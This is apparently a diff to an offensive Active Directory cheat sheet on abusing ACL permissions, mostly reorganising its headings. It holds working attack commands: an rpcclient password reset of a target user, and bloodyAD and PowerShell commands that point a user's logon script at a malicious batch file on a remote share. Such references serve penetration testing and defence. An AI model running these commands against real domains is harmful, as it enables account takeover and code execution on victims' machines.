@@ -147,16 +147,16 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
   ```
 
-WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script :
+### WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script :
 
-* Windows/Linux:
-
-  ```ps1
+#### From Linux:
+* **With BloodyAD**  
+  ```bash
   bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
   ```
 
-* Windows only:
-
+#### From Windows:
+* **With Powershell**  
   ```ps1
   Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"
   ```
